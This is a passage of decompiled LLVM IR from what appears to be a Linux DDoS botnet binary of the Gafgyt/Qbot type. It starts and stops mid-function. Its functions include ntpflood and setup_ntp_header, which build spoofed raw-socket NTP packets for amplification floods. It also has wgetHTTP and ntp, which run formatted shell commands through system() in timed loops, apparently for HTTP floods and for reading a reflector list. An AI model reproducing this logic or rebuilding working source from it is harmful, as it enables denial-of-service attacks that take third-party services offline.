  %v0_804b2b2 = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804b2b2, i32* %eax.global-to-local, align 4
  %v1_804b2b7 = add i32 %v0_804b2b2, -25
  %v5_804b2b7 = icmp ult i32 %v0_804b2b2, 25
  %v9_804b2b7 = icmp eq i32 %v1_804b2b7, 0
  %v2_804b2ba = or i1 %v5_804b2b7, %v9_804b2b7
  br i1 %v2_804b2ba, label %dec_label_pc_804b2cb, label %dec_label_pc_804b2bc

dec_label_pc_804b2bc:                             ; preds = %dec_label_pc_804b2a7
  store i32 %v1_804b2b7, i32* %eax.global-to-local, align 4
  store i32 %v1_804b2b7, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804b2d5

dec_label_pc_804b2cb:                             ; preds = %dec_label_pc_804b2a7
  store i32 0, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804b2d5

dec_label_pc_804b2d5:                             ; preds = %dec_label_pc_804b2bc, %dec_label_pc_804b29a, %dec_label_pc_804b28b, %dec_label_pc_804b2cb
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v4_804b2df = add i32 %storemerge, 1
  br label %dec_label_pc_804b2e2

dec_label_pc_804b2e2:                             ; preds = %dec_label_pc_804b21a, %dec_label_pc_804b2d5
  %storemerge = phi i32 [ %v4_804b2df, %dec_label_pc_804b2d5 ], [ 0, %dec_label_pc_804b21a ]
  store i32 %v1_804b2e5, i32* %eax.global-to-local, align 4
  %v2_804b2e8 = load i32, i32* %v1_804b2e8, align 4
  store i32 %v2_804b2e8, i32* %eax.global-to-local, align 4
  %v1_804b2ea = load i32, i32* @esp, align 4
  %v2_804b2ea = inttoptr i32 %v1_804b2ea to i32*
  store i32 %v2_804b2e8, i32* %v2_804b2ea, align 4
  %v1_804b2ed = call i32 @atol(i32 %storemerge)
  %v9_804b2f2 = mul i32 %v1_804b2ed, 20
  store i32 %v9_804b2f2, i32* %eax.global-to-local, align 4
  %v8_804b2f9 = icmp sgt i32 %v9_804b2f2, %storemerge
  br i1 %v8_804b2f9, label %dec_label_pc_804b258, label %dec_label_pc_804b2ff

dec_label_pc_804b2ff:                             ; preds = %dec_label_pc_804b2e2
  %v0_804b2ff = load i32, i32* @esp, align 4
  %v1_804b2ff = inttoptr i32 %v0_804b2ff to i32*
  store i32 0, i32* %v1_804b2ff, align 4
  %v1_804b306 = call i32 @__GI_exit(i32 %storemerge)
  store i32 %v1_804b306, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b30b

dec_label_pc_804b30b:                             ; preds = %dec_label_pc_804b00a, %entry, %dec_label_pc_804b2ff
  %v0_804b315 = phi i32 [ %v1_804b036, %dec_label_pc_804b00a ], [ %v1_804afa0, %entry ], [ %v1_804b306, %dec_label_pc_804b2ff ]
  ret i32 %v0_804b315

; uselistorder directives
  uselistorder i32 %v9_804b2f2, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v1_804b2b7, { 1, 0, 2 }
  uselistorder i32 %v0_804b2a7, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804b2e5, { 1, 0 }
  uselistorder i32 %v3_804b1ad, { 1, 0, 2 }
  uselistorder i32 %v2_804b1a8, { 0, 2, 1 }
  uselistorder i32 %storemerge344, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804b176, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_804b0d1, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v4_804b03e, { 1, 0 }
  uselistorder i32 %v4_804afde, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 17, 6, 7, 8, 0, 1, 3, 4, 2, 5, 13, 9, 10, 11, 12, 14, 16, 15, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 42, 41 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b30b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b2e2, { 1, 0 }
  uselistorder label %dec_label_pc_804b2d5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b00a, { 1, 0 }
  uselistorder label %dec_label_pc_804afde, { 1, 0 }
}

define i32 @wgetHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1052 = alloca i32, align 4
  %v1_804b327 = call i32 @mfork(i32 %arg2)
  %v1_804b32c = icmp eq i32 %v1_804b327, 0
  %v1_804b32e = icmp eq i1 %v1_804b32c, false
  br i1 %v1_804b32e, label %dec_label_pc_804b52f, label %dec_label_pc_804b334

dec_label_pc_804b334:                             ; preds = %entry
  %v4_804b334 = add i32 %arg3, -1
  %v9_804b334 = sub i32 0, %arg3
  %v10_804b334 = and i32 %arg3, %v9_804b334
  %v11_804b334 = icmp slt i32 %v10_804b334, 0
  %v12_804b334 = icmp eq i32 %v4_804b334, 0
  %v13_804b334 = icmp slt i32 %v4_804b334, 0
  %v3_804b338 = icmp eq i1 %v13_804b334, %v11_804b334
  %v4_804b338 = icmp eq i1 %v12_804b334, false
  %v5_804b338 = and i1 %v4_804b338, %v3_804b338
  br i1 %v5_804b338, label %dec_label_pc_804b360, label %dec_label_pc_804b33a

dec_label_pc_804b33a:                             ; preds = %dec_label_pc_804b334
  %v3_804b34f = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_8069ecc.97 to i32))
  %v1_804b35b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b360

dec_label_pc_804b360:                             ; preds = %dec_label_pc_804b334, %dec_label_pc_804b33a
  %v1_804b363 = add i32 %arg4, 4
  %v1_804b366 = inttoptr i32 %v1_804b363 to i32*
  %v2_804b366 = load i32, i32* %v1_804b366, align 4
  %v1_804b36e = add i32 %arg4, 8
  %v1_804b371 = inttoptr i32 %v1_804b36e to i32*
  %v2_804b371 = load i32, i32* %v1_804b371, align 4
  %v1_804b376 = call i32 @atol(i32 %v2_804b371)
  %v2_804b385 = call i32 @__GI_time(i32* null)
  %v5_804b38a = add i32 %v2_804b385, %v1_804b376
  %v1_804b390 = call i32 @random()
  %v2_804b3b3 = sdiv i32 %v1_804b390, 36
  store i32 %v2_804b3b3, i32* @ebx, align 4
  %tmp = mul i32 %v2_804b3b3, -36
  %v2_804b3cf = add i32 %v1_804b390, %tmp
  store i32 %v2_804b3cf, i32* @edi, align 4
  %v3_804b403 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8069eef.98 to i32))
  %v4_804b495 = inttoptr i32 %v2_804b366 to i8*
  %v2_804b4f2 = ptrtoint i32* %stack_var_-1052 to i32
  br label %dec_label_pc_804b50e

dec_label_pc_804b40d:                             ; preds = %dec_label_pc_804b50e
  %v0_804b40d = call i32 @random()
  %v2_804b430 = sdiv i32 %v0_804b40d, 36
  store i32 %v2_804b430, i32* @ebx, align 4
  %tmp35 = mul i32 %v2_804b430, -36
  %v2_804b44c = add i32 %v0_804b40d, %tmp35
  %v1_804b45a = mul i32 %v2_804b44c, 4
  %v2_804b45a = add i32 %v1_804b45a, 134678656
  %v3_804b45a = inttoptr i32 %v2_804b45a to i32*
  %v4_804b45a = load i32, i32* %v3_804b45a, align 4
  %v4_804b475 = inttoptr i32 %v4_804b45a to i8*
  %v3_804b47b = call i32 @_strlen(i8* %v4_804b475)
  store i1 false, i1* @df, align 1
  store i32 %v2_804b366, i32* @edi, align 4
  %v3_804b49b = call i32 @_strlen(i8* %v4_804b495)
  %v3_804b47b34 = add i32 %v3_804b47b, %v3_804b49b
  %v2_804b4a5 = mul i32 %v3_804b47b34, 4
  %v1_804b4a8 = add i32 %v2_804b4a5, 164
  %v9_804b4fb = call i32 @__GI_snprintf(i32 %v2_804b4f2, i32 %v1_804b4a8, i32 ptrtoint ([181 x i8]* @global_var_8069f0c.99 to i32), i32 %v4_804b45a, i32 %v2_804b366, i32 %v4_804b45a, i32 %v2_804b366)
  %v1_804b509 = call i32 @system(i32 %v2_804b4f2)
  br label %dec_label_pc_804b50e

dec_label_pc_804b50e:                             ; preds = %dec_label_pc_804b360, %dec_label_pc_804b40d
  %v2_804b515 = call i32 @__GI_time(i32* null)
  %v5_804b51d = icmp slt i32 %v2_804b515, %v5_804b38a
  br i1 %v5_804b51d, label %dec_label_pc_804b40d, label %dec_label_pc_804b523

dec_label_pc_804b523:                             ; preds = %dec_label_pc_804b50e
  %v1_804b52a = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804b52f

dec_label_pc_804b52f:                             ; preds = %entry, %dec_label_pc_804b523
  %v0_804b538 = phi i32 [ %v1_804b327, %entry ], [ %v1_804b52a, %dec_label_pc_804b523 ]
  ret i32 %v0_804b538

; uselistorder directives
  uselistorder i32 %v2_804b366, { 0, 1, 3, 2 }
  uselistorder i32 %v4_804b334, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b52f, { 1, 0 }
  uselistorder label %dec_label_pc_804b50e, { 1, 0 }
  uselistorder label %dec_label_pc_804b360, { 1, 0 }
}

define i32 @setup_ntp_header(i16* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b539 = load i32, i32* @ebp, align 4
  store i32 %v0_804b539, i32* %stack_var_-4, align 4
  %v2_804b546 = call i32 @htons(i16 5678)
  %v1_804b54b = urem i32 %v2_804b546, 65536
  store i32 %v1_804b54b, i32* %edx.global-to-local, align 4
  %v4_804b54e = ptrtoint i16* %arg1 to i32
  %v1_804b551 = trunc i32 %v2_804b546 to i16
  store i16 %v1_804b551, i16* %arg1, align 2
  %v2_804b55b = call i32 @htons(i16 123)
  %v1_804b566 = trunc i32 %v2_804b55b to i16
  %v3_804b566 = add i32 %v4_804b54e, 2
  %v4_804b566 = inttoptr i32 %v3_804b566 to i16*
  store i16 %v1_804b566, i16* %v4_804b566, align 2
  %v1_804b56d = add i32 %v4_804b54e, 6
  %v2_804b56d = inttoptr i32 %v1_804b56d to i16*
  store i16 0, i16* %v2_804b56d, align 2
  %v1_804b576 = add i32 %v4_804b54e, 8
  store i32 %v1_804b576, i32* %edx.global-to-local, align 4
  %v2_804b57e = inttoptr i32 %v1_804b576 to i32*
  store i32 704839703, i32* %v2_804b57e, align 4
  %v1_804b585 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b585 = add i32 %v1_804b585, 4
  %v3_804b585 = inttoptr i32 %v2_804b585 to i32*
  store i32 0, i32* %v3_804b585, align 4
  %v2_804b58f = call i32 @htons(i16 16)
  %v1_804b594 = urem i32 %v2_804b58f, 65536
  store i32 %v1_804b594, i32* %edx.global-to-local, align 4
  %v1_804b59a = trunc i32 %v2_804b58f to i16
  %v4_804b59a = add i32 %v4_804b54e, 4
  %v5_804b59a = inttoptr i32 %v4_804b59a to i16*
  store i16 %v1_804b59a, i16* %v5_804b59a, align 2
  %v2_804b59e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b59e, i32* @ebp, align 4
  ret i32 %v4_804b54e

; uselistorder directives
  uselistorder i32 %v2_804b58f, { 1, 0 }
  uselistorder i32 %v2_804b546, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @ntpflood() local_unnamed_addr {
entry:
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4148 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  %v2_804b5b0 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_804b5bc = add i32 %v2_804b5b0, 20
  %v5_804b5bf = inttoptr i32 %v1_804b5bc to i16*
  %v1_804b5ce = add i32 %tmp20, 12
  %v2_804b5ce = inttoptr i32 %v1_804b5ce to i32*
  %v3_804b5ce = load i32, i32* %v2_804b5ce, align 4
  %v1_804b5ec = add i32 %tmp20, 4
  %v2_804b5ec = inttoptr i32 %v1_804b5ec to i32*
  %v3_804b5ec = load i32, i32* %v2_804b5ec, align 4
  %v3_804b609 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804b611 = icmp slt i32 %v3_804b609, 0
  %v1_804b615 = icmp eq i1 %v5_804b611, false
  br i1 %v1_804b615, label %dec_label_pc_804b623, label %dec_label_pc_804b617

dec_label_pc_804b617:                             ; preds = %entry
  %v1_804b61e = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804b623

dec_label_pc_804b623:                             ; preds = %entry, %dec_label_pc_804b617
  %v2_804b62a = call i32 @__GI_time(i32* null)
  %v1_804b632 = call i32 @init_rand(i32 %v2_804b62a)
  %v3_804b653 = bitcast i32* %stack_var_-4128 to i8*
  %v4_804b653 = call i32 @__GI_memset(i8* %v3_804b653, i32 0, i32 4096)
  %v2_804b65e = call i32 @setup_ip_header(i8* %v3_804b653)
  %v2_804b669 = call i32 @setup_ntp_header(i16* %v5_804b5bf)
  %v0_804b66e = call i32 @random()
  %v2_804b696 = sdiv i32 %v0_804b66e, 13065
  store i32 %v2_804b696, i32* @ebx, align 4
  %tmp26 = mul i32 %v2_804b696, -64509
  %v2_804b6aa = add i32 %tmp26, %v0_804b66e
  %v1_804b6b9 = add i32 %v2_804b6aa, 1026
  %v1_804b6c4 = trunc i32 %v1_804b6b9 to i16
  %v2_804b6c4 = call i32 @htons(i16 %v1_804b6c4)
  %v1_804b6cf = trunc i32 %v2_804b6c4 to i16
  store i16 %v1_804b6cf, i16* %v5_804b5bf, align 4
  %v2_804b6db = add i32 %v2_804b5b0, 12
  %v3_804b6db = inttoptr i32 %v2_804b6db to i32*
  store i32 %v3_804b5ce, i32* %v3_804b6db, align 4
  %v1_804b6e1 = add i32 %v3_804b5ec, 4
  %v2_804b6e1 = inttoptr i32 %v1_804b6e1 to i32*
  %v3_804b6e1 = load i32, i32* %v2_804b6e1, align 4
  %v2_804b6e7 = add i32 %v2_804b5b0, 16
  %v3_804b6e7 = inttoptr i32 %v2_804b6e7 to i32*
  store i32 %v3_804b6e1, i32* %v3_804b6e7, align 4
  %v1_804b6ed = or i32 %v2_804b5b0, 2
  %v2_804b6ed = inttoptr i32 %v1_804b6ed to i16*
  %v3_804b6ed = load i16, i16* %v2_804b6ed, align 2
  %div = udiv i16 %v3_804b6ed, 2
  %v2_804b6f1 = zext i16 %div to i32
  %v2_804b703 = bitcast i32* %stack_var_-4128 to i16*
  %v3_804b703 = call i32 @csum(i16* %v2_804b703, i32 %v2_804b6f1)
  %v1_804b70e = trunc i32 %v3_804b703 to i16
  %v3_804b70e = add i32 %v2_804b5b0, 10
  %v4_804b70e = inttoptr i32 %v3_804b70e to i16*
  store i16 %v1_804b70e, i16* %v4_804b70e, align 2
  store i32 1, i32* %stack_var_-4148, align 4
  %v2_804b71c = ptrtoint i32* %stack_var_-4148 to i32
  %v5_804b74a = call i32 @__GI_setsockopt(i32 %v3_804b609, i32 0, i32 3, i32 %v2_804b71c, i32 4)
  %v2_804b74f = icmp slt i32 %v5_804b74a, 0
  %v1_804b751 = icmp eq i1 %v2_804b74f, false
  br i1 %v1_804b751, label %dec_label_pc_804b75f, label %dec_label_pc_804b753

dec_label_pc_804b753:                             ; preds = %dec_label_pc_804b623
  %v1_804b75a = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804b75f

dec_label_pc_804b75f:                             ; preds = %dec_label_pc_804b623, %dec_label_pc_804b753
  %v2_804b766 = call i32 @__GI_time(i32* null)
  %v1_804b76e = call i32 @init_rand(i32 %v2_804b766)
  %v3_804b7e1 = add i32 %v2_804b5b0, 4
  %v4_804b7e1 = inttoptr i32 %v3_804b7e1 to i16*
  br label %dec_label_pc_804b77d

dec_label_pc_804b77d:                             ; preds = %dec_label_pc_804b83c, %dec_label_pc_804b75f
  %stack_var_-20.0 = phi i32 [ %v3_804b5ec, %dec_label_pc_804b75f ], [ %v3_804b7b9, %dec_label_pc_804b83c ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804b75f ], [ %v4_804b83c, %dec_label_pc_804b83c ]
  %v3_804b785 = load i16, i16* %v2_804b6ed, align 2
  %v4_804b785 = zext i16 %v3_804b785 to i32
  %v6_804b7b1 = call i32 @sendto(i32 %v3_804b609, i32 %v2_804b5b0, i32 %v4_804b785, i32 0, i32 %stack_var_-20.0, i32 16)
  %v1_804b7b9 = add i32 %stack_var_-20.0, 532
  %v2_804b7b9 = inttoptr i32 %v1_804b7b9 to i32*
  %v3_804b7b9 = load i32, i32* %v2_804b7b9, align 4
  %v1_804b7c5 = add i32 %v3_804b7b9, 4
  %v2_804b7c5 = inttoptr i32 %v1_804b7c5 to i32*
  %v3_804b7c5 = load i32, i32* %v2_804b7c5, align 4
  store i32 %v3_804b7c5, i32* %v3_804b6e7, align 4
  %v1_804b7ce = call i32 @rand_cmwc(i32 %v3_804b7b9)
  %v1_804b7d6 = call i32 @htonl(i32 %v1_804b7ce)
  %v1_804b7e1 = trunc i32 %v1_804b7d6 to i16
  store i16 %v1_804b7e1, i16* %v4_804b7e1, align 4
  %v3_804b7e8 = load i16, i16* %v2_804b6ed, align 2
  %div27 = udiv i16 %v3_804b7e8, 2
  %v2_804b7ec = zext i16 %div27 to i32
  %v3_804b7fe = call i32 @csum(i16* %v2_804b703, i32 %v2_804b7ec)
  %v1_804b809 = trunc i32 %v3_804b7fe to i16
  store i16 %v1_804b809, i16* %v4_804b70e, align 2
  %v0_804b80d = load i64, i64* @global_var_807e2e0.88, align 8
  %v1_804b80d = trunc i64 %v0_804b80d to i32
  %v1_804b812 = add i32 %v1_804b80d, 1
  %v1_804b813 = sext i32 %v1_804b812 to i64
  store i64 %v1_804b813, i64* @global_var_807e2e0.88, align 32
  %v0_804b818 = load i32, i32* @global_var_807e1a8.89, align 8
  %v6_804b823 = icmp ugt i32 %v0_804b818, %storemerge
  br i1 %v6_804b823, label %dec_label_pc_804b83c, label %dec_label_pc_804b825

dec_label_pc_804b825:                             ; preds = %dec_label_pc_804b77d
  %v0_804b82f = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804b837 = sext i32 %v0_804b82f to i64
  %v2_804b837 = call i32 @usleep(i64 %v1_804b837)
  br label %dec_label_pc_804b83c

dec_label_pc_804b83c:                             ; preds = %dec_label_pc_804b77d, %dec_label_pc_804b825
  %stack_var_-4156.0 = phi i32 [ %storemerge, %dec_label_pc_804b77d ], [ 0, %dec_label_pc_804b825 ]
  %v4_804b83c = add i32 %stack_var_-4156.0, 1
  br label %dec_label_pc_804b77d

; uselistorder directives
  uselistorder i32 %v3_804b7b9, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v2_804b696, { 1, 0 }
  uselistorder i32 %v0_804b66e, { 1, 0 }
  uselistorder i32 %v2_804b5b0, { 5, 1, 2, 0, 3, 4, 6 }
  uselistorder i32* %stack_var_-4148, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder label %dec_label_pc_804b83c, { 1, 0 }
  uselistorder label %dec_label_pc_804b75f, { 1, 0 }
  uselistorder label %dec_label_pc_804b623, { 1, 0 }
}

define i32 @ntp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-1088 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804b861 = call i32 @mfork(i32 %arg2)
  store i32 %v2_804b861, i32* %eax.global-to-local, align 4
  %v1_804b866 = icmp eq i32 %v2_804b861, 0
  %v1_804b868 = icmp eq i1 %v1_804b866, false
  br i1 %v1_804b868, label %dec_label_pc_804bdba, label %dec_label_pc_804b86e

dec_label_pc_804b86e:                             ; preds = %entry
  %v5_804b885 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v5_804b885, i32* %eax.global-to-local, align 4
  %v5_804b88d = icmp slt i32 %v5_804b885, 0
  %v1_804b891 = icmp eq i1 %v5_804b88d, false
  br i1 %v1_804b891, label %dec_label_pc_804b89f, label %dec_label_pc_804b893

dec_label_pc_804b893:                             ; preds = %dec_label_pc_804b86e
  %v2_804b89a = call i32 @__GI_exit(i32 1)
  store i32 %v2_804b89a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b89f

dec_label_pc_804b89f:                             ; preds = %dec_label_pc_804b86e, %dec_label_pc_804b893
  %v4_804b89f = add i32 %arg3, -5
  %v9_804b89f = sub i32 4, %arg3
  %v10_804b89f = and i32 %v9_804b89f, %arg3
  %v11_804b89f = icmp slt i32 %v10_804b89f, 0
  %v12_804b89f = icmp eq i32 %v4_804b89f, 0
  %v13_804b89f = icmp slt i32 %v4_804b89f, 0
  %v3_804b8a3 = icmp eq i1 %v13_804b89f, %v11_804b89f
  %v4_804b8a3 = icmp eq i1 %v12_804b89f, false
  %v5_804b8a3 = and i1 %v4_804b8a3, %v3_804b8a3
  br i1 %v5_804b8a3, label %dec_label_pc_804b8cb, label %dec_label_pc_804b8a5

dec_label_pc_804b8a5:                             ; preds = %dec_label_pc_804b89f
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804b8ba = call i32 @Send(i32 %arg1, i32 ptrtoint ([112 x i8]* @global_var_8069fcc.102 to i32))
  store i32 %v3_804b8ba, i32* %eax.global-to-local, align 4
  %v2_804b8c6 = call i32 @__GI_exit(i32 1)
  store i32 %v2_804b8c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8cb

dec_label_pc_804b8cb:                             ; preds = %dec_label_pc_804b89f, %dec_label_pc_804b8a5
  %v1_804b8ce = add i32 %arg4, 12
  store i32 %v1_804b8ce, i32* %eax.global-to-local, align 4
  %v1_804b8d1 = inttoptr i32 %v1_804b8ce to i32*
  %v2_804b8d1 = load i32, i32* %v1_804b8d1, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804b8de = and i32 %v2_804b8d1, -256
  store i32 %v1_804b8de, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804b8e1 = inttoptr i32 %v2_804b8d1 to i8*
  %v3_804b8e7 = call i32 @_strlen(i8* %v4_804b8e1)
  %v4_804b8e7 = mul i32 %v3_804b8e7, -1
  %v5_804b8e7 = add i32 %v4_804b8e7, -2
  store i32 %v5_804b8e7, i32* %ecx.global-to-local, align 4
  %v1_804b8ed = sub i32 0, %v4_804b8e7
  store i32 %v1_804b8ed, i32* %edx.global-to-local, align 4
  %v2_804b8f5 = mul i32 %v3_804b8e7, 5
  %v1_804b8f7 = add i32 %v2_804b8f5, 160
  store i32 %v1_804b8f7, i32* %eax.global-to-local, align 4
  %v4_804b8ff = add i32 %v2_804b8f5, -863
  %v9_804b8ff = sub i32 862, %v2_804b8f5
  %v10_804b8ff = and i32 %v9_804b8ff, %v1_804b8f7
  %v11_804b8ff = icmp slt i32 %v10_804b8ff, 0
  %v12_804b8ff = icmp eq i32 %v4_804b8ff, 0
  %v13_804b8ff = icmp slt i32 %v4_804b8ff, 0
  %v3_804b906 = icmp eq i1 %v13_804b8ff, %v11_804b8ff
  %v4_804b906 = icmp eq i1 %v12_804b8ff, false
  %v5_804b906 = and i1 %v4_804b906, %v3_804b906
  br i1 %v5_804b906, label %dec_label_pc_804bdba, label %dec_label_pc_804b90c

dec_label_pc_804b90c:                             ; preds = %dec_label_pc_804b8cb
  store i32 %v1_804b8ce, i32* %eax.global-to-local, align 4
  %v2_804b912 = load i32, i32* %v1_804b8d1, align 4
  store i32 %v2_804b912, i32* %edx.global-to-local, align 4
  store i32 %v1_804b8ce, i32* %eax.global-to-local, align 4
  %v2_804b91a = load i32, i32* %v1_804b8d1, align 4
  store i32 %v2_804b91a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b8ce, i32* %eax.global-to-local, align 4
  %v2_804b922 = load i32, i32* %v1_804b8d1, align 4
  store i32 %v2_804b922, i32* @ebx, align 4
  store i32 %v1_804b8ce, i32* %eax.global-to-local, align 4
  %v2_804b92a = load i32, i32* %v1_804b8d1, align 4
  store i32 %v2_804b92a, i32* @esi, align 4
  store i32 %v1_804b8ce, i32* %eax.global-to-local, align 4
  %v2_804b932 = load i32, i32* %v1_804b8d1, align 4
  store i32 %v1_804b8f7, i32* @edi, align 4
  %v2_804b957 = ptrtoint i32* %stack_var_-1088 to i32
  store i32 %v2_804b957, i32* %eax.global-to-local, align 4
  %v9_804b960 = call i32 @__GI_snprintf(i32 %v2_804b957, i32 %v1_804b8f7, i32 ptrtoint ([171 x i8]* @global_var_806a03c.103 to i32), i32 %v2_804b932, i32 %v2_804b92a, i32 %v2_804b922, i32 %v2_804b91a)
  store i32 %v2_804b957, i32* %eax.global-to-local, align 4
  %v2_804b96e = call i32 @system(i32 %v2_804b957)
  store i32 %v2_804b96e, i32* %eax.global-to-local, align 4
  %v3_804b97a = call i32 @__GI_time(i32* null)
  store i32 %v3_804b97a, i32* %eax.global-to-local, align 4
  %v2_804b982 = call i32 @srand(i32 %v3_804b97a)
  store i32 0, i32* @global_var_807f300.80, align 256
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804b9a5 = call i32 @malloc(i32 128)
  store i32 %v2_804b9a5, i32* %edx.global-to-local, align 4
  %v1_804b9b3 = inttoptr i32 %v2_804b9a5 to i8*
  store i32 %v2_804b9a5, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b9ba = call i8* @_memset(i8* %v1_804b9b3, i32 0, i32 128)
  %v6_804b9ba = ptrtoint i8* %v5_804b9ba to i32
  store i32 %v6_804b9ba, i32* %ecx.global-to-local, align 4
  %v0_804b9bc = load i32, i32* %edx.global-to-local, align 4
  %v1_804b9c4 = add i32 %arg4, 16
  store i32 %v1_804b9c4, i32* %eax.global-to-local, align 4
  %v1_804b9c7 = inttoptr i32 %v1_804b9c4 to i32*
  %v2_804b9c7 = load i32, i32* %v1_804b9c7, align 4
  store i32 %v2_804b9c7, i32* %eax.global-to-local, align 4
  %v2_804b9cc = call i32 @atol(i32 %v2_804b9c7)
  %v1_804b9d7 = add i32 %arg4, 20
  store i32 %v1_804b9d7, i32* %eax.global-to-local, align 4
  %v1_804b9da = inttoptr i32 %v1_804b9d7 to i32*
  %v2_804b9da = load i32, i32* %v1_804b9da, align 4
  store i32 %v2_804b9da, i32* %eax.global-to-local, align 4
  %v2_804b9df = call i32 @atol(i32 %v2_804b9da)
  store i32 %v2_804b9df, i32* @eax, align 4
  store i32 0, i32* @global_var_807e1a8.89, align 8
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v3_804ba11 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806a0e7.104 to i32), i32 ptrtoint ([2 x i8]* @global_var_8069c83.83 to i32))
  store i32 %v3_804ba11, i32* %eax.global-to-local, align 4
  %v4_804bb91 = inttoptr i32 %v0_804b9bc to i8*
  %v1_804ba2c = and i32 %v0_804b9bc, -256
  %v5_804ba92 = add i32 %v0_804b9bc, -1
  br label %dec_label_pc_804bb80.outer

dec_label_pc_804ba1e:                             ; preds = %dec_label_pc_804bb80
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ba2c, i32* %eax.global-to-local, align 4
  %v3_804ba35 = call i32 @_strlen(i8* %v4_804bb91)
  %v4_804ba35 = mul i32 %v3_804ba35, -1
  %v5_804ba35 = add i32 %v4_804ba35, -2
  store i32 %v5_804ba35, i32* %ecx.global-to-local, align 4
  %v5_804ba3c = sub i32 %v0_804b9bc, %v4_804ba35
  %v1_804ba3f = add i32 %v5_804ba3c, -1
  store i32 %v1_804ba3f, i32* %eax.global-to-local, align 4
  %v1_804ba40 = inttoptr i32 %v1_804ba3f to i8*
  %v2_804ba40 = load i8, i8* %v1_804ba40, align 1
  %v3_804ba40 = zext i8 %v2_804ba40 to i32
  store i32 %v3_804ba40, i32* %eax.global-to-local, align 4
  %v10_804ba43 = icmp eq i8 %v2_804ba40, 10
  br i1 %v10_804ba43, label %dec_label_pc_804ba74, label %dec_label_pc_804ba47

dec_label_pc_804ba47:                             ; preds = %dec_label_pc_804ba1e
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ba2c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804b9bc, i32* @edi, align 4
  %v3_804ba5e = call i32 @_strlen(i8* %v4_804bb91)
  %v4_804ba5e = mul i32 %v3_804ba5e, -1
  %v5_804ba5e = add i32 %v4_804ba5e, -2
  store i32 %v5_804ba5e, i32* @ecx, align 4
  %v5_804ba65 = sub i32 %v0_804b9bc, %v4_804ba5e
  %v1_804ba68 = add i32 %v5_804ba65, -1
  store i32 %v1_804ba68, i32* %eax.global-to-local, align 4
  %v1_804ba69 = inttoptr i32 %v1_804ba68 to i8*
  %v2_804ba69 = load i8, i8* %v1_804ba69, align 1
  %v3_804ba69 = zext i8 %v2_804ba69 to i32
  store i32 %v3_804ba69, i32* %eax.global-to-local, align 4
  %v10_804ba6c = icmp eq i8 %v2_804ba69, 13
  %v1_804ba6e = icmp eq i1 %v10_804ba6c, false
  br i1 %v1_804ba6e, label %dec_label_pc_804bb80, label %dec_label_pc_804ba74

dec_label_pc_804ba74:                             ; preds = %dec_label_pc_804ba47, %dec_label_pc_804ba1e
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ba2c, i32* %eax.global-to-local, align 4
